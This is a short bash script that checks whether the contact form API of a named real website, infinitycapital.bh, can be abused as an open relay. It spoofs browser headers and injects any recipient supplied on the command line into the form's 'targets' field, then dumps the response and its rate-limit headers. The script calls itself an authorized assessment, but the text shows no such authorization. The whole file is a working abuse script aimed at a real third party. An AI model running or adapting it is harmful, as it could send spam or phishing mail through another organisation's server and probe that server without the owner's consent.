#!/bin/bash
# Independent verification of /api/send open-relay
# $1 = the "targets" value to send to
H="https://www.infinitycapital.bh/api/send"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
OUT=$(mktemp)
CODE=$(curl -s -m 45 -o "$OUT" -D /tmp/vrelay.hdr -w "%{http_code}" -X POST "$H" \
  -H "User-Agent: $UA" \
  -H 'Origin: https://www.infinitycapital.bh' \
  -H 'Referer: https://www.infinitycapital.bh/contact' \
  -F 'fname=Security' \
  -F 'lname=Verification' \
  -F 'areacode=+973' \
  -F 'tel=00000000' \
  -F 'cname=Independent Audit' \
  -F 'subject=Authorized security assessment' \
  -F 'msg=Automated authorized security verification of the contact relay. No action required. Disregard.' \
  -F 'check=bot' \
  -F "targets=$1")
echo "### targets=[$1]"
echo "### http=$CODE"
echo "--- body:"; cat "$OUT"; echo
echo "--- hdrs:"; grep -iE 'HTTP/|x-matched-path|x-vercel-id|ratelimit|retry-after|server:|content-type' /tmp/vrelay.hdr | tr -d '\r'
rm -f "$OUT"
